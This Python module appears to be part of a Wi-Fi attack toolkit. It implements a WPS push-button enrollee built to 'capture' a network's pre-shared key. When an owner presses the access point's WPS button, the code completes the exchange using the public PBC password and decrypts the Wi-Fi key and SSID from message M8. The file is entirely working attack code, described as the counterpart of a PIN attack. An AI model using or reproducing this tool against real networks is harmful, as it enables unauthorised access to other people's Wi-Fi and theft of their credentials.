"""WpsEnrollee — the enrollee-side WSC state machine, for PBC capture.

When someone presses an AP's WPS button it becomes the **Registrar** and hands
the network credential to any **Enrollee** that completes WSC within the ~120 s
walk window. We play that enrollee: the message polarity is the mirror of the
PIN attack (we build M1/M3/M5/M7, the AP sends WSC_Start/M2/M4/M6/M8), and the
**PSK arrives in M8's Credential**.

PBC has no secret: the device password is the public constant "00000000"
(`messages.PBC_PASSWORD`), so both sides derive the same PSK1/PSK2 and our
E-hashes verify. The exchange's confidentiality rests entirely on the DH key,
which is why this must be active — a passive capture can't derive it.

Transport-agnostic (same `send`/`recv` contract as WpsRegistrar); the live
adapter and the in-process fake-Registrar test both satisfy it.
"""

from __future__ import annotations

import logging
import os
import time

from wifit3.dot11.wsc import messages as M
from wifit3.dot11.wsc import crypto as wc
from .registrar import (AttemptOutcome, PinResult, WpsTransport, config_error_name,
                        describe_frame, disassoc_reason)

logger = logging.getLogger(__name__)


class WpsEnrollee:
    def __init__(
        self,
        transport: WpsTransport,
        bssid: bytes,
        our_mac: bytes,
        msg_timeout: float = 5.0,
        eapol_start_timeout: float = 2.0,
        overall_timeout: float = 30.0,
        max_resends: int = 2,
        tx_ack: bool = False,
        ack_resends: int = 0,
        log=None,
        should_stop=None,
    ):
        self.t = transport
        self.bssid = bssid
        self.our_mac = our_mac
        self.msg_timeout = msg_timeout
        self.eapol_start_timeout = eapol_start_timeout
        self.overall_timeout = overall_timeout
        # max_resends: in-session re-prompts on a silent window (no MAC rotation). tx_ack:
        # each frame waits for the AP's link-ACK and resends up to ack_resends times.
        self.max_resends = max_resends
        self.tx_ack = tx_ack
        self.ack_resends = ack_resends
        self._last_1x_frame = None
        self.log = log or logger.debug
        # Polled before each blocking recv so a user Stop aborts within one msg_timeout.
        self.should_stop = should_stop or (lambda: False)

    async def _send_1x(self, payload_1x: bytes) -> None:
        frame = M.build_data_frame(self.bssid, self.our_mac, self.bssid, payload_1x)
        self._last_1x_frame = frame
        if self.tx_ack:
            landed = await self.t.send_until_ack(frame, max_retries=self.ack_resends)
            if landed is False:
                self.log(f"[WPS] → frame un-ACKed after {self.ack_resends + 1} sends (AP not hearing us)")
        else:
            await self.t.send_no_wait(frame)

    async def run(self) -> AttemptOutcome:
        """Drive EAPOL-Start → Identity → M1..M7 → extract the PSK from M8."""
        priv, pke = wc.dh_generate_keypair()
        nonce_e = os.urandom(wc.NONCE_LEN)
        uuid_e = os.urandom(16)
        e_s1 = os.urandom(wc.SECRET_NONCE_LEN)
        e_s2 = os.urandom(wc.SECRET_NONCE_LEN)
        mac_e = self.our_mac

        pkr = nonce_r = authkey = keywrapkey = psk1 = psk2 = None
        highest_mt = 0          # stale-retransmit guard (WSC never runs backward)
        sent_m1 = False
        resends_left = self.max_resends   # in-session resend budget; refreshed on every AP frame

        logged: set = set()

        def once(stage: str, msg: str) -> None:
            if stage not in logged:
                logged.add(stage)
                self.log(msg)

        # Deduped wire-phase skeleton in the debug log (→ sent, ← received)
        phased: set = set()

        def phase(label: str) -> None:
            if label not in phased:
                phased.add(label)
                logger.debug("[WPS] %s", label)

        phase("→ EAPOL-Start")
        await self._send_1x(M.eapol_start())

        deadline = time.monotonic() + self.overall_timeout
        timeout = self.eapol_start_timeout
        while time.monotonic() < deadline:
            if self.should_stop():
                return AttemptOutcome(PinResult.ABORTED, "<PBC>", detail="stopped by user")
            frame = await self.t.recv(min(timeout, deadline - time.monotonic()))
            timeout = self.msg_timeout
            if frame is None:
                # No frame in the window.
                if resends_left > 0 and self._last_1x_frame is not None:
                    resends_left -= 1
                    await self.t.send_no_wait(self._last_1x_frame)
                    continue
                return AttemptOutcome(PinResult.TIMEOUT, "<PBC>", detail="no EAP response")
            resends_left = self.max_resends   # AP is talking → fresh silence budget

            p = M.parse_rx_frame(frame)
            if p is None:
                # A DEAUTH/DISASSOC tore down our EAP session
                kind = describe_frame(frame)
                if kind in ("mgmt/DEAUTH", "mgmt/DISASSOC"):
                    why = disassoc_reason(frame)
                    self.log(f"[WPS] ← {kind} reason={why} (AP dropped us) — abandoning to retry")
                    return AttemptOutcome(PinResult.TIMEOUT, "<PBC>", detail=f"deauth ({why})")
                continue

            if p.is_identity_request:
                phase("← Identity-Req")
                if not sent_m1:
                    phase("→ Identity")
                    await self._send_1x(M.eap_identity_response(p.eap_id, M.ENROLLEE_IDENTITY))
                continue

            if p.is_eap_failure or p.wsc_msg_type == M.WPS_WSC_NACK:
                # Decode the AP's stated reason (WSC ATTR_CONFIG_ERROR).
                # #Code 12 = "Multiple PBC sessions" = we tripped the AP's overlap guard.
                ce_raw = p.attrs.get(M.ATTR_CONFIG_ERROR)
                ce = int.from_bytes(ce_raw[:2], "big") if ce_raw and len(ce_raw) >= 2 else None
                phase("← EAP-FAIL/NACK")
                return AttemptOutcome(PinResult.PROTO_ERROR, "<PBC>",
                                      detail=f"NACK: {config_error_name(ce)}", config_error=ce)

            # WSC_Start (an opcode, not a msg-type) kicks off M1.
            if p.wsc_opcode == M.WSC_START and p.wsc_msg_type == 0:
                phase("← WSC_Start")
                if not sent_m1:
                    m1 = M.build_m1(uuid_e, mac_e, nonce_e, pke)
                    phase("→ M1")
                    await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m1))
                    sent_m1 = True
                    once("m1", "M1: sending enrollee identity + public key")
                continue

            mt = p.wsc_msg_type
            if mt and mt < highest_mt:
                continue                  # stale retransmit of a stage we've passed
            if mt in (M.WPS_M2, M.WPS_M4, M.WPS_M6, M.WPS_M8):
                highest_mt = mt

            if mt == M.WPS_M2:
                phase("← M2")
                pkr = p.attrs.get(M.ATTR_PUBLIC_KEY)
                nonce_r = p.attrs.get(M.ATTR_REGISTRAR_NONCE)
                if not pkr or not nonce_r:
                    return AttemptOutcome(PinResult.PROTO_ERROR, "<PBC>", detail="M2 missing PKr/nonce")
                shared = wc.dh_shared_secret(pkr, priv)
                authkey, keywrapkey, _ = wc.derive_keys(shared, nonce_e, mac_e, nonce_r)
                psk1, psk2 = wc.derive_psk(authkey, M.PBC_PASSWORD)
                m3 = M.build_m3_enrollee(nonce_r, e_s1, e_s2, psk1, psk2, pke, pkr,
                                         authkey, p.raw_wsc_attrs)
                phase("→ M3")
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m3))
                once("m3", "M2 → M3: E-hash committed")

            elif mt == M.WPS_M4:
                phase("← M4")
                if authkey is None:
                    return AttemptOutcome(PinResult.PROTO_ERROR, "<PBC>", detail="M4 before keys")
                m5 = M.build_m5_enrollee(nonce_r, e_s1, authkey, keywrapkey, p.raw_wsc_attrs)
                phase("→ M5")
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m5))
                once("m5", "M4 → M5: revealing E-S1")

            elif mt == M.WPS_M6:
                phase("← M6")
                m7 = M.build_m7_enrollee(nonce_r, e_s2, authkey, keywrapkey, p.raw_wsc_attrs)
                phase("→ M7")
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_MSG, m7))
                once("m7", "M6 → M7: revealing E-S2")

            elif mt == M.WPS_M8:
                phase("← M8")
                creds = M.extract_m8_credentials(p.attrs.get(M.ATTR_ENCR_SETTINGS, b""), keywrapkey)
                phase("→ WSC_DONE")
                await self._send_1x(M.eap_wsc_response(p.eap_id, M.WSC_DONE,
                                                       M.build_wsc_done(nonce_e, nonce_r)))
                if not creds or "network_key" not in creds:
                    return AttemptOutcome(PinResult.PROTO_ERROR, "<PBC>", detail="M8 had no Network Key")
                ssid = creds.get("ssid")
                psk = creds["network_key"]
                once("m8", "M8 → SUCCESS: credential decrypted")
                return AttemptOutcome(
                    PinResult.SUCCESS, "<PBC>",
                    psk=psk.decode("utf-8", "replace"),
                    ssid=ssid.decode("utf-8", "replace") if ssid else None,
                )

        return AttemptOutcome(PinResult.TIMEOUT, "<PBC>", detail="exchange did not converge")
